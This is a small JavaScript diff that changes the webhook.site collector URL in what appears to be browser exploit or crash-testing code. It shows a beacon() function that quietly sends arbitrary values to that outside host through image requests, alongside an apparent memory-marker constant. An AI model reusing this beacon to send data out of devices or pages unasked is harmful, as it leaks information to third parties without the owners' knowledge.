@@ -5,7 +5,7 @@
 //    renderer -> "crash detected" before beacons flush. v2 (pure async) delivered 7/7.
 //  => PURE ASYNC beacons, zero blocking, bounded allocations.
 // Proof the device reaches the internet: it successfully loaded https://webhook.site/... at 22:53:46.
-const SINK = 'https://webhook.site/9b9f3ae6-9ca5-4a70-8d42-d9a45b78db92';
+const SINK = 'https://webhook.site/2e90e5ef-e377-4add-8fd5-05d360fce7f7';
 const MARKER = 1.2345678901234e-300;
 function beacon(t, v){
   try { var i = new Image(); i.src = SINK + '?t=' + encodeURIComponent(t) + '&v=' + encodeURIComponent(String(v).slice(0,150)); } catch(e){}
